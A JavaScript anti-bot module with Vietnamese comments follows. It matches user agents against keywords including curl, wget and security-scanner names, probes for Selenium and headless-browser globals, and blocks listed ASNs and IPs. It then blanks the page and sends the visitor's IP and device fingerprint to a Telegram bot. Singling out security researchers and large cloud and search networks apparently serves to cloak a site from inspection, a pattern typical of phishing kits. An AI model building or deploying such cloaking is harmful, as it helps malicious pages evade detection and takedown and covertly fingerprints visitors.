import { noti_token, noti_chat_id } from "./config.js";

const blockedKeywords = [
  // automation / crawler / headless ("crawler"/"googlebot"... xử sau geo — spec 3.6)
  "scraper",
  "scrapy",
  "puppeteer",
  "playwright",
  "selenium",
  "phantomjs",
  "phantom",
  "nightmare",
  "headless",
  "chromedriver",
  "webdriver",
  "lighthouse",
  // HTTP / scripting UA (đúng spec — dễ false positive)
  "http",
  "client",
  "curl",
  "wget",
  "python-requests",
  "python",
  "java",
  "ruby",
  "go",
  // SEO / scanner / crawler catalog
  "scan",
  "ahrefs",
  "semrush",
  "sistrix",
  "censysinspect",
  "krebsonsecurity",
  "ivre-masscan",
  "masscan",
  "larbin",
  "libwww",
  "spinn3r",
  "zgrab",
  "yandex",
  "baidu",
  "sogou",
  "tweetmeme",
  "mailchimp",
  "mailgun",
  "misting",
  "botpoke",
];

const seleniumWindowProps = [
  "__selenium_unwrapped",
  "__webdriver_evaluate",
  "__driver_evaluate",
  "__webdriver_script_function",
  "__webdriver_script_func",
  "__webdriver_script_fn",
  "__fxdriver_evaluate",
  "__driver_unwrapped",
  "__webdriver_unwrapped",
  "__selenium_evaluate",
  "__fxdriver_unwrapped",
];

const seleniumDocumentProps = [
  "__webdriver_evaluate",
  "__selenium_evaluate",
  "__webdriver_script_function",
  "$chrome_asyncScriptInfo",
];

const blockedASNs = [
  15169, 32934, 396982, 8075, 16510, 198605, 45102, 201814, 14061, 214961,
  401115, 135377, 60068, 55720, 397373, 208312, 63949, 210644, 6939, 209,
  51396, 147049,
];

const blockedIPs = ["95.214.55.43", "154.213.184.3"];

/** Từ "bot" trong UA (ngoại trừ crawler tìm kiếm xử ở bước silent sau geo — spec 3.6). */
const matchesGenericBotToken = () => {
  const ua = navigator.userAgent;
  return (
    /\bbot\b/i.test(ua) &&
    !/\b(?:googlebot|bingbot|applebot|adsbot-google|duplexweb-google)\b/i.test(
      ua
    )
  );
};

export const ensureIpInfo = async () => {
  try {
    if (typeof localStorage === "undefined") return;
    if (localStorage.getItem("ipInfo")) return;
    const geoData = await fetchJson("https://get.geojs.io/v1/ip/geo.json");
    localStorage.setItem(
      "ipInfo",
      JSON.stringify({
        asn: geoData.asn,
        ip: geoData.ip,
        organization_name: geoData.organization_name,
        organization: geoData.organization,
      })
    );
  } catch {
    /* noop */
  }
};

/** Chạy toàn bộ pipeline chặn bot theo thứ tự spec. */
const detectBot = async () => {
  if (matchesGenericBotToken()) {
    return await haltAsBotKeyword("bot", { notifyTelegram: true });
  }

  const keywordHit = blockedKeywordsMatcher();
  if (keywordHit) {
    return await haltAsBotKeyword(keywordHit, { notifyTelegram: true });
  }

  const adv = await checkAdvancedWebDriverDetection();
  if (adv.isBot) return { isBot: true, reason: adv.reason };

  const nav = await checkNavigatorAnomalies();
  if (nav.isBot) return { isBot: true, reason: nav.reason };

  const scr = await checkScreenAnomalies();
  if (scr.isBot) return { isBot: true, reason: scr.reason };

  const geo = await checkAndBlockByGeoIP();
  if (geo.isBlocked)
    return { isBot: true, reason: geo.reason ?? "blocked by geo" };

  /** Spec 3.6: sau geo, không Telegram / không xóa body trong nhánh này. */
  const silentBots = /\b(?:googlebot|bingbot|crawler|spider)\b/i.test(
    navigator.userAgent
  );
  if (silentBots) {
    return {
      isBot: true,
      reason: "obvious bot UA (silent, post-geo)",
    };
  }

  return { isBot: false };
};

/** Trả substring khớp (hoặc null). Tránh chỉ substring "go" — dùng các pattern an toàn hơn trong mảng. */
const blockedKeywordsMatcher = () => {
  const ua = navigator.userAgent.toLowerCase();
  return blockedKeywords.find((keyword) =>
    keyword ? ua.includes(keyword.toLowerCase()) : false
  );
};

const haltAsBotKeyword = async (blockedKeyword, { notifyTelegram }) => {
  const reason = `user agent chứa keyword: ${blockedKeyword}`;
  if (notifyTelegram) await sendBotTelegram(reason);
  await blockPage();
  return { isBot: true, reason };
};

const blockPage = async () => {
  try {
    document.body.innerHTML = "";
  } catch {
    /* noop */
  }
  try {
    window.location.href = "about:blank";
  } catch {
    /* noop */
  }
};

const fetchJson = async (url, opts) => {
  const res = await fetch(url, opts);
  if (!res.ok) throw new Error(String(res.status));
  return res.json();
};

const sendBotTelegram = async (reason) => {
  try {
    if (!noti_token || String(noti_token).trim() === "") return;

    const geoData = await fetchJson("https://get.geojs.io/v1/ip/geo.json");

    const fullFingerprint = {
      asn: geoData.asn,
      organization_name: geoData.organization_name,
      organization: geoData.organization,
      ip: geoData.ip,
      navigator: {
        userAgent: navigator.userAgent,
        hardwareConcurrency: navigator.hardwareConcurrency,
        maxTouchPoints: navigator.maxTouchPoints,
        webdriver: navigator.webdriver,
      },
      screen: {
        width: screen.width,
        height: screen.height,
        availWidth: screen.availWidth,
        availHeight: screen.availHeight,
      },
    };

    const msg =
      `🚫 <b>BOT BỊ CHẶN</b>\n` +
      `🔍 <b>Lý do:</b> <code>${escapeHtmlSnippet(reason)}</code>\n\n` +
      `📍 <b>IP:</b> <code>${escapeHtmlSnippet(String(fullFingerprint.ip ?? ""))}</code>\n` +
      `🏢 <b>ASN:</b> <code>${escapeHtmlSnippet(String(fullFingerprint.asn ?? ""))}</code>\n` +
      `🏛️ <b>Nhà mạng:</b> <code>${escapeHtmlSnippet(String(fullFingerprint.organization_name ?? fullFingerprint.organization ?? "Không rõ"))}</code>\n\n` +
      `🌐 <b>Trình duyệt:</b> <code>${escapeHtmlSnippet(fullFingerprint.navigator.userAgent)}</code>\n` +
      `💻 <b>CPU:</b> <code>${fullFingerprint.navigator.hardwareConcurrency ?? ""}</code> nhân\n` +
      `📱 <b>Touch:</b> <code>${fullFingerprint.navigator.maxTouchPoints ?? ""}</code> điểm\n` +
      `🤖 <b>WebDriver:</b> <code>${fullFingerprint.navigator.webdriver ? "Có" : "Không"}</code>\n\n` +
      `📺 <b>Màn hình:</b> <code>${fullFingerprint.screen.width}x${fullFingerprint.screen.height}</code>\n` +
      `📐 <b>Màn hình thực:</b> <code>${fullFingerprint.screen.availWidth}x${fullFingerprint.screen.availHeight}</code>`;

    const telegramUrl = `https://api.telegram.org/bot${noti_token}/sendMessage`;

    await fetch(telegramUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: noti_chat_id,
        text: msg,
        parse_mode: "HTML",
      }),
    });
  } catch {
    /* noop */
  }
};

const escapeHtmlSnippet = (s) =>
  String(s)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");

export const checkAndBlockByGeoIP = async () => {
  try {
    await ensureIpInfo();
    const ipInfo = localStorage.getItem("ipInfo");
    if (!ipInfo) {
      return { isBlocked: false };
    }

    const data = JSON.parse(ipInfo);

    if (blockedASNs.includes(Number(data.asn))) {
      const reason = `ASN bị chặn: ${data.asn}`;
      await sendBotTelegram(reason);
      await blockPage();
      return { isBlocked: true, reason };
    }

    if (data.ip && blockedIPs.includes(data.ip)) {
      const reason = `IP bị chặn: ${data.ip}`;
      await sendBotTelegram(reason);
      await blockPage();
      return { isBlocked: true, reason };
    }

    return { isBlocked: false };
  } catch {
    return { isBlocked: false };
  }
};

const haltAutomation = async (reason) => {
  await sendBotTelegram(reason);
  await blockPage();
  return { isBot: true, reason };
};

export const checkAdvancedWebDriverDetection = async () => {
  if (navigator.webdriver === true) {
    return haltAutomation("navigator.webdriver = true");
  }

  if ("__nightmare" in window) {
    return haltAutomation("__nightmare in window");
  }
  if ("_phantom" in window || "callPhantom" in window) {
    return haltAutomation("phantom in window");
  }
  if ("Buffer" in window) {
    return haltAutomation("Buffer in window");
  }
  /** Rủi ro false-positive (một số bundler/polyfill đặt emit trên global). */
  if ("emit" in window) {
    return haltAutomation("emit in window");
  }
  if ("spawn" in window) {
    return haltAutomation("spawn in window");
  }

  const foundWin = seleniumWindowProps.find((prop) => prop in window);
  if (foundWin) {
    return haltAutomation(`selenium window property: ${foundWin}`);
  }

  const foundDoc = seleniumDocumentProps.find((prop) => prop in document);
  if (foundDoc) {
    return haltAutomation(`selenium document property: ${foundDoc}`);
  }

  return { isBot: false };
};

export const checkNavigatorAnomalies = async () => {
  if (navigator.webdriver === true) {
    return haltAutomation("navigator.webdriver = true (navigator check)");
  }

  if (
    navigator.hardwareConcurrency !== undefined &&
    navigator.hardwareConcurrency !== null &&
    navigator.hardwareConcurrency > 128
  ) {
    return haltAutomation(
      `hardwareConcurrency quá cao: ${navigator.hardwareConcurrency}`
    );
  }
  if (
    navigator.hardwareConcurrency !== undefined &&
    navigator.hardwareConcurrency !== null &&
    navigator.hardwareConcurrency < 1
  ) {
    return haltAutomation(
      `hardwareConcurrency quá thấp: ${navigator.hardwareConcurrency}`
    );
  }

  return { isBot: false };
};

export const checkScreenAnomalies = async () => {
  if (screen.width === 2000 && screen.height === 2000) {
    return haltAutomation("màn hình 2000x2000 (bot pattern)");
  }

  if (screen.width > 4000 || screen.height > 4000) {
    return haltAutomation(
      `màn hình quá lớn: ${screen.width}x${screen.height}`
    );
  }
  if (screen.width < 200 || screen.height < 200) {
    return haltAutomation(
      `màn hình quá nhỏ: ${screen.width}x${screen.height}`
    );
  }

  return { isBot: false };
};

export default detectBot;
